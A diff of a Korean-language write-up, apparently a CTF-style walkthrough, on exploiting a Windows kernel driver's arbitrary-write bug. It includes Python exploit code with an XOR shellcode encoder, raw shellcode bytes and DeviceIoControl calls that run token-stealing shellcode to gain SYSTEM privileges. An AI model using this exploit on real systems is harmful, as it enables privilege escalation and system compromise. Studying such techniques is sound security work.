@@ -282,7 +282,7 @@ fffff803`07433050  41414141`41414141
 '''
 ```
 
-그런데 만약 이 취약점을 사용할 경우, `kernel_to_user_handler()`에서 `user_msg_len`의 값이 `0xFFFFFFFF`가 되기 때문에 항상 `kernel_msg_len`의 값이 `memcpy()` 함수의 3번째 인자로 사용됩니다. `kernel_msg_len`은 `kernel_msg`에 보관된 값이 문자열이라고 가정한 상태에서 길이를 계산하기 떄문에, 임의의 주소에 쓰고자 하는 값 중간에 NULL 바이트가 들어가지 않도록 유의해야 합니다. 
+그런데 만약 이 취약점을 사용할 경우, `kernel_to_user_handler()`에서 `user_msg_len`의 값이 `0xFFFFFFFF`가 되기 때문에 항상 `kernel_msg_len`의 값이 `memcpy()` 함수의 3번째 인자로 사용됩니다. `kernel_msg_len`은 `kernel_msg`에 보관된 값이 문자열이라고 가정한 상태에서 길이를 계산하기 때문에, 임의의 주소에 쓰고자 하는 값 중간에 NULL 바이트가 들어가지 않도록 유의해야 합니다. 
 
 어쨌든 이제 AAW( Arbitrary Address Write )가 가능한 취약점을 찾았으니 본격적인 공격단계로 넘어가 보겠습니다.
 
@@ -321,9 +321,9 @@ fffff803`068d3b9a e8e1e5afff      call    nt!guard_dispatch_icall (fffff803`063d
 
 보통 Windows 커널 익스플로잇은 PID가 항상 4로 고정되어 있는 SYSTEM 프로세스의 [Token을 훔쳐오는 쉘코드를 실행하는 형태](https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/)로 이루어집니다. 
 
-Token이란 [현재 프로세스 혹은 스레드의 권한을 정의하는 객체](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)를 의미하는데, 현재 Windows에 상에서 동작하는 모든 프로세스들은 [_EPROCESS 객체](https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html)의 double linked list 형태로 관리되며 Token 역시 이 객체안에 보관됩니다. Windows 커널 익스플로잇을 위한 쉘코드는 이 `_EPROCESS` 객체의 double linked list를 순회하며 SYSTEM 프로세스를 찾는 방식으로 동작합니다.
+Token이란 [현재 프로세스 혹은 스레드의 권한을 정의하는 객체](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)를 의미하는데, 현재 Windows에 상에서 동작하는 모든 프로세스들은 [_EPROCESS 객체](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1809%20Redstone%205%20(October%20Update)/_EPROCESS)의 double linked list 형태로 관리되며 Token 역시 이 객체안에 보관됩니다. Windows 커널 익스플로잇을 위한 쉘코드는 이 `_EPROCESS` 객체의 double linked list를 순회하며 SYSTEM 프로세스를 찾는 방식으로 동작합니다.
 
-저는 이미 KePwnLib.py에 `tokenStealingShellcoeForWin10_1809`란 이름으로 정의해둔 쉘코드를 사용했는데, 중간에 NULL가 들어가지 않도록 간단한 XOR encoder를 가지고 아래와 같은 익스플로잇 코드를 작성했습니다.
+저는 이미 KePwnLib.py에 `tokenStealingShellcodeForWin10_1809`란 이름으로 정의해둔 쉘코드를 사용했는데, 중간에 NULL가 들어가지 않도록 간단한 XOR encoder를 가지고 아래와 같은 익스플로잇 코드를 작성했습니다.
 
 ( 그리고 이유는 알 수 없지만, 분명 [NonPagedPool 객체 영역은 실행권한이 없다](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/no-execute-nonpaged-pool?redirectedfrom=MSDN)고 알고 있었는데 `ExAllocatePoolWithTag(NonPagedPool, 0x1000)`으로 할당한 영역에 RWX 권한이 있었습니다 )
 
@@ -381,12 +381,13 @@ def xored_shellcode(sc):
     decoder += "\x48\xFF\xC0"             # inc rax
     decoder += "\xE2\xF2"                 # loop decode_loop
     
-    
     result = ""
     result += "\x90"  # NonPagedPool object address always like 0xXXXX~00, need to terminate that NULL
     result += pusha() # pusha code for register backup before XOR decoding
     result += decoder
     result += xored_sc
+    result += popa()
+    result += go_back_home()
 
     return result
 
@@ -420,7 +421,7 @@ print "[+] NonPagedPool object = 0x%016x" % pool_addr
 
 # write shellcode into NonPagedPool Object
 shellcode = tokenStealingShellcodeForWin10_1809
-shellcode = xored_shellcode(shellcode[len(pusha()):])
+shellcode = xored_shellcode(shellcode)
 memmove(buf, shellcode, len(shellcode))
 DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)
 DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), len(shellcode), NULL, 0, byref(dwRet), 0)
@@ -457,7 +458,7 @@ popCMD()
 예를 들어,
 
 1. [CreatePipe()](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)로 생성한 [Named Pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)에 값을 쓰면 NonPagedPool 객체에 들어간다 [link](http://www.alex-ionescu.com/?p=231).
-2. `win32kbase!NtGdiDdDDIGetContextSchedulingPriority` 같이 상대적으로 잘 사용되지 않는 syscall 함수를 덮어씌워 사용할 수 있다 [link](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18#file-wctf_2018_searchme_exploit-cpp-L394-L396).
+2. `win32kbase!NtGdiDdDDIGetContextSchedulingPriority` 같이 상대적으로 잘 사용되지 않는 syscall 함수를 덮어씌워 사용할 수 있다 [link](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18#file-wctf_2018_searchme_exploit-cpp-L382-L396).
 3. `SEP_TOKEN_PRIVILEGES` 구조체를 덮어씌워 SYSTEM 권한을 가진 프로세스에 코드를 삽입할 수 있다 [link](https://labs.bluefrostsecurity.de/publications/2016/01/07/exploiting-cve-2014-4113-on-windows-8.1).
 4. ETC...
 
